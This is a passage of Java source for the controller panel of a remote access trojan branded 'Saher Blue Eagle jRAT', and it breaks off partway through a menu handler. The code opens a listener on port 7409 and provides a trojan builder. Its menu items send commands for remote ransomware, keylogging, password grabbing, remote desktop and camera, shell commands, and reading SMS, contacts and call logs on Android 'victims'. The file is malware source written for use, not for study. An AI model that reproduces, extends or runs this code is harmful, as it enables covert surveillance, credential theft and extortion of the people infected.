package New;

import java.awt.BorderLayout;
import java.awt.Checkbox;
import java.awt.Color;
import java.awt.Component;
import java.awt.Desktop;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridBagLayout;
import java.awt.HeadlessException;
import java.awt.Image;
import java.awt.TextArea;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Stack;
import java.util.TreeMap;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.UIManager;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.JTableHeader;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;
//Program Owner : SaherBlueEagle

public class Master implements ActionListener {
	private static Server_X_Client Server;
	private static JFrame form ;
	private static String user_name="";
	private static JLabel screen = new JLabel();
	private static JTable j; 
	private static   JScrollPane sp;
	private static String curr_version ="";
	private static Master Instance;
	public static boolean is_listening = false;
	private static String bt_qp_tas="";
	private static String ULX = "0";
	private static boolean Run_Once = false;
    private static JMenuItem menuItemFilemanager;
    private static String Self_Path ="";
    private static JMenuItem menuItemDesktop;
    private static JMenuItem menuItemProcess;
    private static JMenuItem menuItemTerminal;
    private static JMenuItem menuItemInstall;    
    private static JMenuItem RunRansomware;    
    private static JMenuItem Install_pass_grab; 
    private static JMenuItem pass_grab;
    private static JMenuItem menuItemOther;
    private static JMenuItem menuItemRemoveVictim;

    private static JMenuItem android_cam;
    private static JMenuItem android_contacts;
    private static JMenuItem android_calllogs;
    private static JMenuItem android_filemanager;
    private static JMenuItem android_sms;    
    private static JMenuItem android_terminal; 
    private static JMenuItem android_keylogger;
    private static JMenuItem android_phone_settings;
    private static JMenuItem android_chat;
    private static JMenuItem android_apps;
    private static JMenuItem android_uninstall;
	private static String Exe_Split = "fxf0x4x4x0fxf";
	private static String Exe_Ending = "c2x2824x828200x0c";
	private static String Jar_Split = "fxf0x4x4x0fxf";
	private static String Jar_Ending = "c2x2824x828200x0c";

	 private static Map<String, String> map = new TreeMap<String, String>   (String.CASE_INSENSITIVE_ORDER);
	 private static String getCode(String country){
	     String countryFound = map.get(country);
	     if(countryFound==null){
	             countryFound="UK";
	     }
	     return countryFound;
	     }
	 private static void prepare_country(){
			
		 map.put("Andorra, Principality Of", "AD");
	     map.put("United Arab Emirates", "AE");
	     map.put("Afghanistan, Islamic State Of", "AF");
	     map.put("Antigua And Barbuda", "AG");
	     map.put("Anguilla", "AI");
	     map.put("Albania", "AL");
	     map.put("Armenia", "AM");
	     map.put("Netherlands Antilles", "AN");
	     map.put("Angola", "AO");
	     map.put("Antarctica", "AQ");
	     map.put("Argentina", "AR");
	     map.put("American Samoa", "AS");
	     map.put("Austria", "AT");
	     map.put("Australia", "AU");
	     map.put("Aruba", "AW");
	     map.put("Azerbaidjan", "AZ");
	     map.put("Bosnia-Herzegovina", "BA");
	     map.put("Barbados", "BB");
	     map.put("Bangladesh", "BD");
	     map.put("Belgium", "BE");
	     map.put("Burkina Faso", "BF");
	     map.put("Bulgaria", "BG");
	     map.put("Bahrain", "BH");
	     map.put("Burundi", "BI");
	     map.put("Benin", "BJ");
	     map.put("Bermuda", "BM");
	     map.put("Brunei Darussalam", "BN");
	     map.put("Bolivia", "BO");
	     map.put("Brazil", "BR");
	     map.put("Bahamas", "BS");
	     map.put("Bhutan", "BT");
	     map.put("Bouvet Island", "BV");
	     map.put("Botswana", "BW");
	     map.put("Belarus", "BY");
	     map.put("Belize", "BZ");
	     map.put("Canada", "CA");
	     map.put("Cocos (Keeling) Islands", "CC");
	     map.put("Central African Republic", "CF");
	     map.put("Congo, The Democratic Republic Of The", "CD");
	     map.put("Congo", "CG");
	     map.put("Switzerland", "CH");
	     map.put("Ivory Coast (Cote D'Ivoire)", "CI");
	     map.put("Cook Islands", "CK");
	     map.put("Chile", "CL");
	     map.put("Cameroon", "CM");
	     map.put("China", "CN");
	     map.put("Colombia", "CO");
	     map.put("Costa Rica", "CR");
	     map.put("Former Czechoslovakia", "CS");
	     map.put("Cuba", "CU");
	     map.put("Cape Verde", "CV");
	     map.put("Christmas Island", "CX");
	     map.put("Cyprus", "CY");
	     map.put("Czech Republic", "CZ");
	     map.put("Germany", "DE");
	     map.put("Djibouti", "DJ");
	     map.put("Denmark", "DK");
	     map.put("Dominica", "DM");
	     map.put("Dominican Republic", "DO");
	     map.put("Algeria", "DZ");
	     map.put("Ecuador", "EC");
	     map.put("Estonia", "EE");
	     map.put("Egypt", "EG");
	     map.put("Western Sahara", "EH");
	     map.put("Eritrea", "ER");
	     map.put("Spain", "ES");
	     map.put("Ethiopia", "ET");
	     map.put("Finland", "FI");
	     map.put("Fiji", "FJ");
	     map.put("Falkland Islands", "FK");
	     map.put("Micronesia", "FM");
	     map.put("Faroe Islands", "FO");
	     map.put("France", "FR");
	     map.put("France (European Territory)", "FX");
	     map.put("Gabon", "GA");
	     map.put("Great Britain", "UK");
	     map.put("Grenada", "GD");
	     map.put("Georgia", "GE");
	     map.put("French Guyana", "GF");
	     map.put("Ghana", "GH");
	     map.put("Gibraltar", "GI");
	     map.put("Greenland", "GL");
	     map.put("Gambia", "GM");
	     map.put("Guinea", "GN");
	     map.put("Guadeloupe (French)", "GP");
	     map.put("Equatorial Guinea", "GQ");
	     map.put("Greece", "GR");
	     map.put("S. Georgia & S. Sandwich Isls.", "GS");
	     map.put("Guatemala", "GT");
	     map.put("Guam (USA)", "GU");
	     map.put("Guinea Bissau", "GW");
	     map.put("Guyana", "GY");
	     map.put("Hong Kong", "HK");
	     map.put("Heard And McDonald Islands", "HM");
	     map.put("Honduras", "HN");
	     map.put("Croatia", "HR");
	     map.put("Haiti", "HT");
	     map.put("Hungary", "HU");
	     map.put("Indonesia", "ID");
	     map.put("Ireland", "IE");
	     map.put("Israel", "IL");
	     map.put("India", "IN");
	     map.put("British Indian Ocean Territory", "IO");
	     map.put("Iraq", "IQ");
	     map.put("Iran", "IR");
	     map.put("Iceland", "IS");
	     map.put("Italy", "IT");
	     map.put("Jamaica", "JM");
	     map.put("Jordan", "JO");
	     map.put("Japan", "JP");
	     map.put("Kenya", "KE");
	     map.put("Kyrgyz Republic (Kyrgyzstan)", "KG");
	     map.put("Cambodia, Kingdom Of", "KH");
	     map.put("Kiribati", "KI");
	     map.put("Comoros", "KM");
	     map.put("Saint Kitts & Nevis Anguilla", "KN");
	     map.put("North Korea", "KP");
	     map.put("South Korea", "KR");
	     map.put("Kuwait", "KW");
	     map.put("Cayman Islands", "KY");
	     map.put("Kazakhstan", "KZ");
	     map.put("Laos", "LA");
	     map.put("Lebanon", "LB");
	     map.put("Saint Lucia", "LC");
	     map.put("Liechtenstein", "LI");
	     map.put("Sri Lanka", "LK");
	     map.put("Liberia", "LR");
	     map.put("Lesotho", "LS");
	     map.put("Lithuania", "LT");
	     map.put("Luxembourg", "LU");
	     map.put("Latvia", "LV");
	     map.put("Libya", "LY");
	     map.put("Morocco", "MA");
	     map.put("Monaco", "MC");
	     map.put("Moldavia", "MD");
	     map.put("Madagascar", "MG");
	     map.put("Marshall Islands", "MH");
	     map.put("Macedonia", "MK");
	     map.put("Mali", "ML");
	     map.put("Myanmar", "MM");
	     map.put("Mongolia", "MN");
	     map.put("Macau", "MO");
	     map.put("Northern Mariana Islands", "MP");
	     map.put("Martinique (French)", "MQ");
	     map.put("Mauritania", "MR");
	     map.put("Montserrat", "MS");
	     map.put("Malta", "MT");
	     map.put("Mauritius", "MU");
	     map.put("Maldives", "MV");
	     map.put("Malawi", "MW");
	     map.put("Mexico", "MX");
	     map.put("Malaysia", "MY");
	     map.put("Mozambique", "MZ");
	     map.put("Namibia", "NA");
	     map.put("New Caledonia (French)", "NC");
	     map.put("Niger", "NE");
	     map.put("Norfolk Island", "NF");
	     map.put("Nigeria", "NG");
	     map.put("Nicaragua", "NI");
	     map.put("Netherlands", "NL");
	     map.put("Norway", "NO");
	     map.put("Nepal", "NP");
	     map.put("Nauru", "NR");
	     map.put("Neutral Zone", "NT");
	     map.put("Niue", "NU");
	     map.put("New Zealand", "NZ");
	     map.put("Oman", "OM");
	     map.put("Panama", "PA");
	     map.put("Peru", "PE");
	     map.put("Polynesia (French)", "PF");
	     map.put("Papua New Guinea", "PG");
	     map.put("Philippines", "PH");
	     map.put("Pakistan", "PK");
	     map.put("Poland", "PL");
	     map.put("Saint Pierre And Miquelon", "PM");
	     map.put("Pitcairn Island", "PN");
	     map.put("Puerto Rico", "PR");
	     map.put("Portugal", "PT");
	     map.put("Palau", "PW");
	     map.put("Paraguay", "PY");
	     map.put("Qatar", "QA");
	     map.put("Reunion (French)", "RE");
	     map.put("Romania", "RO");
	     map.put("Russian Federation", "RU");
	     map.put("Rwanda", "RW");
	     map.put("Saudi Arabia", "SA");
	     map.put("Solomon Islands", "SB");
	     map.put("Seychelles", "SC");
	     map.put("Sudan", "SD");
	     map.put("Sweden", "SE");
	     map.put("Singapore", "SG");
	     map.put("Saint Helena", "SH");
	     map.put("Slovenia", "SI");
	     map.put("Svalbard And Jan Mayen Islands", "SJ");
	     map.put("Slovak Republic", "SK");
	     map.put("Sierra Leone", "SL");
	     map.put("San Marino", "SM");
	     map.put("Senegal", "SN");
	     map.put("Somalia", "SO");
	     map.put("Suriname", "SR");
	     map.put("Saint Tome (Sao Tome) And Principe", "ST");
	     map.put("Former USSR", "SU");
	     map.put("El Salvador", "SV");
	     map.put("Syria", "SY");
	     map.put("Swaziland", "SZ");
	     map.put("Turks And Caicos Islands", "TC");
	     map.put("Chad", "TD");
	     map.put("French Southern Territories", "TF");
	     map.put("Togo", "TG");
	     map.put("Thailand", "TH");
	     map.put("Tadjikistan", "TJ");
	     map.put("Tokelau", "TK");
	     map.put("Turkmenistan", "TM");
	     map.put("Tunisia", "TN");
	     map.put("Tonga", "TO");
	     map.put("East Timor", "TP");
	     map.put("Turkey", "TR");
	     map.put("Trinidad And Tobago", "TT");
	     map.put("Tuvalu", "TV");
	     map.put("Taiwan", "TW");
	     map.put("Tanzania", "TZ");
	     map.put("Ukraine", "UA");
	     map.put("Uganda", "UG");
	     map.put("United Kingdom", "UK");
	     map.put("USA Minor Outlying Islands", "UM");
	     map.put("United States", "US");
	     map.put("Uruguay", "UY");
	     map.put("Uzbekistan", "UZ");
	     map.put("Holy See (Vatican City State)", "VA");
	     map.put("Saint Vincent & Grenadines", "VC");
	     map.put("Venezuela", "VE");
	     map.put("Virgin Islands (British)", "VG");
	     map.put("Virgin Islands (USA)", "VI");
	     map.put("Vietnam", "VN");
	     map.put("Vanuatu", "VU");
	     map.put("Wallis And Futuna Islands", "WF");
	     map.put("Samoa", "WS");
	     map.put("Yemen", "YE");
	     map.put("Mayotte", "YT");
	     map.put("Yugoslavia", "YU");
	     map.put("South Africa", "ZA");
	     map.put("Zambia", "ZM");
	     map.put("Zaire", "ZR");
	     map.put("Zimbabwe", "ZW");
	 }
	private static String global_key="";
	public static JTable Get_j(){
		return j;
	}
	private static  boolean get_fast = false;
	private static  ArrayList<String[][]>  Clients= new ArrayList<String[][]>(); 
	  // Column Names 
    private static String[] columnNames = { "O.S.","ID", "IP Address", "Operating System" ,"Flag","Language / Country","Device Type","Other Data"}; 
	  private static String Get_Key(int coun){
		  String final_key="";
		  String M_ID=	global_key; 
		  return M_ID.substring(0,coun);
	  }
	  
	public static void main(String args[]) throws IOException{
		try {				
			try {
			 
				UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
		      } 
		      catch (Throwable ex) {
		         
		      } 
			
			try {
				 
				String operSys = System.getProperty("os.name").toLowerCase();
		          if (operSys.contains("mac")||operSys.contains("darwin")) {
		          	 File_Seperator = "/";
		        	 File jarDir = new File(ClassLoader.getSystemClassLoader().getResource(".p").getFile());
		        	 String conic_path = jarDir.getAbsolutePath();
		        	 conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
		        	 if (conic_path.contains("file:")){
		        		 conic_path = conic_path.split("file:")[1]; 
		        	 }
		        	 
		        	 if(conic_path.endsWith(".jar")==false){
		        		 conic_path  = conic_path +".jar";
		        	 }
		        	 if (conic_path.startsWith(File_Seperator)){
		        		 conic_path = conic_path.substring(1,conic_path.length());
		        	 }
		       Self_Path = conic_path;
		          	 
		          } else if (operSys.contains("nix") || operSys.contains("nux")
		                  || operSys.contains("aix")) {
		          	 File_Seperator = "/";
		          	 File jarDir = new File(ClassLoader.getSystemClassLoader().getResource(".p").getFile());
		        	 String conic_path = jarDir.getAbsolutePath();
		        	 conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
		        	 if (conic_path.contains("file:")){
		        		 conic_path = conic_path.split("file:")[1]; 
		        	 }
		        	 
		        	 if(conic_path.endsWith(".jar")==false){
		        		 conic_path  = conic_path +".jar";
		        	 }
		        	 if (conic_path.startsWith(File_Seperator)){
		        		 conic_path = conic_path.substring(1,conic_path.length());
		        	 }
		        	 Self_Path = conic_path;
		          } else if (operSys.contains("win")||operSys.contains("window")) {
		          	 File_Seperator = "\\";
		          	 
		     		File jarDir = new File(ClassLoader.getSystemClassLoader().getResource("").getFile());
		     		 String conic_path = jarDir.getAbsolutePath();
		     
		     		 if (conic_path.contains(".jar")){
		     			conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
		     		 }
		     		 if (conic_path.contains("file:")){
		     			 conic_path = conic_path.split("file:")[1]; 
		     		 }
		     		
		     		  
		     		 if (conic_path.startsWith(File_Seperator)){
		     			 conic_path = conic_path.substring(1,conic_path.length());
		     		 }
		     		 if (conic_path.endsWith(File_Seperator)){
		     			 conic_path = conic_path.substring(0,conic_path.length()-1);
		     		 }
		     		 
		     		Self_Path = conic_path;
		          } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
		          
		          	 File_Seperator = "/";
		        	 File jarDir = new File(ClassLoader.getSystemClassLoader().getResource(".p").getFile());
		        	 String conic_path = jarDir.getAbsolutePath();
		        	 conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
		        	 if (conic_path.contains("file:")){
		        		 conic_path = conic_path.split("file:")[1]; 
		        	 }
		        	 
		        	 if(conic_path.endsWith(".jar")==false){
		        		 conic_path  = conic_path +".jar";
		        	 }
		        	 if (conic_path.startsWith(File_Seperator)){
		        		 conic_path = conic_path.substring(1,conic_path.length());
		        	 }
		        	 Self_Path = conic_path;
		          }
		      } 
		      catch (Throwable ex) {
		         
		      } 
			
 
				 
						Check_For_version_update();		
						 try {
 				         
							 Thread listener = new Thread(new Server_X_Client("7409"));
								listener.start();
 						} catch (Exception e2) {
 							MessageBox.errorBox_nothread("Please Run the (SBEjRAT.jar)"+"\n"+"Cannot Start Thread Listener / OS Issue"+"\n"+"NULL Exception : Cannot access memory null value", "Cannot Run Instance [Failed]");
 						 	System.exit(0);
 						}
			
	 
				 
			
		 
			
		} catch (Exception e) {
			
	
			MessageBox.errorBox_nothread("Please Run the (SBEjRAT.jar)"+"\n"+e.getMessage()+"\n"+"NULL Exception : Cannot access memory null value", "Cannot Run Instance [Failed]");
			System.exit(0);
		}

		
		 
		
			
	}
	public static void Do_frame(){
		//Start making the form 
		 
        //———–Look and Feel————-
		 
        //———–Look and Feel————-
		 form = new JFrame("Saher Blue Eagle jRAT V "+curr_version+" [User : "+user_name+"]");
		 form.setResizable(false);
		 form.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
		 form.setBounds((widthx -945)/2,( heightx -397)/2, 945, 397);
		
		 //form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 
		 JButton btnNext = new JButton("Build jar Trojan");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					 new Buildjar_Trojan();
				}
			});
			btnNext.setBounds(85, 260, 170, 23);
			
			
			JButton btnNextx = new JButton("About");
			btnNextx.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					final JFrame form = new JFrame();
			    	 form.setResizable(false);
					 
					 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
					 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
				 
					 form.setBounds((widthx -1017)/2,( heightx -347)/2, 1017, 347);
					  form.setLayout(null);
					  form.setAlwaysOnTop(true);
				      JLabel background=new JLabel( new ImageIcon(Master.class.getResource("/some_icons/abount_png.png")));
				      background.setBounds(0,0,1017,347);
				      
				      background.setLayout(new FlowLayout());
				    
						 form.setUndecorated(true);
						 JLabel btnNext2 = new JLabel("");
						 btnNext2.addMouseListener(new MouseListener() {
							
							@Override
							public void mouseReleased(MouseEvent arg0) {
								// TODO Auto-generated method stub
								 form.setVisible(false);
							}
							
							@Override
							public void mousePressed(MouseEvent arg0) {
								// TODO Auto-generated method stub
								
							}
							
							@Override
							public void mouseExited(MouseEvent arg0) {
								// TODO Auto-generated method stub
								
							}
							
							@Override
							public void mouseEntered(MouseEvent arg0) {
								// TODO Auto-generated method stub
								
							}
							
							@Override
							public void mouseClicked(MouseEvent arg0) {
								// TODO Auto-generated method stub
								
							}
						});
						 
						 
						  btnNext2.setBounds(946,308,60,20);
						 form.add(btnNext2);
						
				      form.add(background);

				   
				   
					form.setBackground(new Color(0,0,0,0));
				       background.setVisible(true);
				       btnNext2.setVisible(true);
				       
				     
						
				      form.setVisible(true);
				}
			});
			btnNextx.setFont(font);
			btnNextx.setBounds(5, 290, 70, 23);
			
			
			
			
			
			JButton btnNext2 = new JButton("Exit");
			btnNext2.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					 if (JOptionPane.showConfirmDialog(form, 
					            "Are you sure you want to Exit Saher Blue Eagle JRAT?", "Exit Program ?", 
					            JOptionPane.YES_NO_OPTION,
					            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
					            System.exit(0);
					        }
					//generateBot("XPT_jar_Trojan.jar");
				}
			});
			btnNext2.setBounds(5, 260, 70, 23);
			JLabel JLabelx = new JLabel("Options");
			 
			JLabelx.setBounds(5, 230, 70, 23);
			JLabel JLabelxx = new JLabel("Screen  "+"\n"+"[exe / jar Trojans Only]");
			 
			
		
		// Data to be displayed in the JTable 
	       
	        //Clients.add(data);
		 
			DefaultTableModel model = new DefaultTableModel(){

    	         @Override
    	         public boolean isCellEditable(int row, int column) {
    	             //Only the third column
    	             return false;
    	         }
    	     	public Class<?> getColumnClass(int column) {
      	           switch(column) {
      	               
      	               case 0: return ImageIcon.class;
      	               case 4 : return ImageIcon.class;
      	               default: return Object.class;
      	           	}
      	   				}
			};
			final JPopupMenu popupMenu_computers = new JPopupMenu();
			 
		     menuItemFilemanager = new JMenuItem("Files Manager");
		     menuItemDesktop = new JMenuItem("Remote Desktop");
			menuItemRemoveVictim = new JMenuItem("Disconnect Trojan");
		 
			
		    menuItemProcess = new JMenuItem("Process Manager");
		    menuItemTerminal = new JMenuItem("Terminal Command");
		    menuItemOther = new JMenuItem("Key Logger Logs");
		    menuItemInstall = new JMenuItem("Install Keylogger");		    
		    RunRansomware = new JMenuItem("Remote Ransomware");
			Install_pass_grab = new JMenuItem("Install Password Grabber");
		    pass_grab = new JMenuItem("Get Saved Passwords");
		    menuItemFilemanager.setBackground(new Color(0, 64, 128));
		    menuItemDesktop.setBackground(new Color(0, 64, 128));
		    menuItemProcess.setBackground(new Color(0, 64, 128));
		    menuItemTerminal.setBackground(new Color(0, 64, 128));
		    menuItemInstall.setBackground(new Color(0, 64, 128));  
		    RunRansomware.setBackground(new Color(0, 64, 128)); 
		    Install_pass_grab.setBackground(new Color(0, 64, 128)); 
		    pass_grab.setBackground(new Color(0, 64, 128));
		    menuItemOther.setBackground(new Color(0, 64, 128));
		    menuItemRemoveVictim.setBackground(new Color(0, 64, 128));
		    android_cam = new JMenuItem("Remote Camera");
		    android_cam.setBackground(new Color(0, 64, 128));
		    android_cam.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
		    android_cam.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("camera_manager_find_camera" + Exe_Split ,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		
		    //####################### android
		    android_calllogs = new JMenuItem("Calls Manager");
		    android_calllogs.setBackground(new Color(0, 64, 128));
		    android_calllogs.setIcon(new ImageIcon(Master.class.getResource("calllogico.png" )));
		    android_calllogs.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("calls_manager" + Exe_Split + Exe_Ending,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		    //####################### android
		    android_chat = new JMenuItem("Remote Chat");
		    android_chat.setBackground(new Color(0, 64, 128));
		    android_chat.setIcon(new ImageIcon(Master.class.getResource("chatico.png" )));
		    android_chat.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("chat" + Exe_Split + "HACKER" +Exe_Split ,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		    //####################### android
		    android_contacts = new JMenuItem("Contacts Manager");
		    android_contacts.setBackground(new Color(0, 64, 128));
		    android_contacts.setIcon(new ImageIcon(Master.class.getResource( "contactsico.png" )));
		    android_contacts.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("contacts_manager" + Exe_Split ,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		  //####################### android
		    android_filemanager = new JMenuItem("Files Manager");
		    android_filemanager.setBackground(new Color(0, 64, 128));
		    android_filemanager.setIcon(new ImageIcon(Master.class.getResource("filemanager.png" )));
		    android_filemanager.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("file_manager" + Exe_Split + "GetPath^&",selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		  //####################### android
		    android_keylogger = new JMenuItem("Keylogger");
		    android_keylogger.setBackground(new Color(0, 64, 128));
		    android_keylogger.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
		    android_keylogger.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("key_logger" + Exe_Split ,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		  //####################### android
		    android_phone_settings = new JMenuItem("Phone");
		    android_phone_settings.setBackground(new Color(0, 64, 128));
		    android_phone_settings.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
		    android_phone_settings.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("phone" + Exe_Split ,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		  //####################### android
		    android_sms = new JMenuItem("SMS Manager");
		    android_sms.setBackground(new Color(0, 64, 128));
		    android_sms.setIcon(new ImageIcon(Master.class.getResource("smsico.png" )));
		    android_sms.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("sms_manager" + Exe_Split + "content://sms/" + Exe_Split + "False",selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		  //####################### android
		    android_terminal = new JMenuItem("Shell Terminal");
		    android_terminal.setBackground(new Color(0, 64, 128)); //black gray 68 68 68 , navy : 0 , 64 128
		    android_terminal.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
		    android_terminal.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 
			        		Send_Data("shell_terminal" + Exe_Split + "cat /proc/version" + Exe_Split + "0" + Exe_Split,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});	
		    android_uninstall = new JMenuItem("Uninstall");
		    android_uninstall.setBackground(new Color(0, 64, 128));
		    android_uninstall.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" +"recylce.png" )));
		    android_uninstall.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			         	//Send_Data("c_close"  ,selected_sock);
			        	Send_Data("uninstall" + Exe_Split + "-1" + Exe_Split,selected_sock,true);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				}); 
		    android_apps = new JMenuItem("Apps Manager");
				android_apps.setBackground(new Color(0, 64, 128));
				android_apps.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
				android_apps.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	Send_Data("applications" + Exe_Split ,selected_sock,true);
			        		//Send_Data("uninstall" + Exe_Split + "-1",selected_sock);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			         
			        	
			        	
			        	
					}
				});
		popupMenu_computers.addPopupMenuListener(new PopupMenuListener() {
			
			@Override
			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				 //check if selected item is valid victim / android
				// 
				try{
					int selectedRow = j.getSelectedRow();
